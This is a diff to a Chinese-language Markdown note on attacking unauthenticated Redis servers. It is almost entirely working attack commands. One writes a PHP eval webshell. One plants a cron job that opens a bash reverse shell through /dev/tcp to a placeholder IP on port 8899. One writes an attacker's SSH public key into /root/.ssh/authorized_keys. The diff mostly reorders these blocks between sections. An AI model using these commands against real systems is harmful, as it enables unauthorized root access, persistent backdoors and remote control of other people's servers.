@@ -35,22 +35,23 @@ set shell "<?php @eval($_POST['shell']);?>"
 save  
 ```
 #### (2) 新建DB写文件->计划任务反弹shell
+
 ```
-(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > re.txt
-```
-```
-cat re.txt | redis-cli -h 192.168.1.11 -x set test
+redis-cli -h 192.168.1.11
 config set dir /var/spool/cron
-set tide "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
+set re "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/8899 0>&1\n\n"
 config set dbfilename root
 save
 ```
 
 #### (3) 新建DB写文件->公钥SSH连接
 ```
-redis-cli -h x.x.x.x
-config set dir /root/.ssh 
-config  set  dbfilename authorized_keys
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > re.txt
+```
+```
+cat re.txt | redis-cli -h 192.168.1.11 -x set re
+config set dir /root/.ssh
+config set dbfilename authorized_keys
 save
 ```
 本地连接：
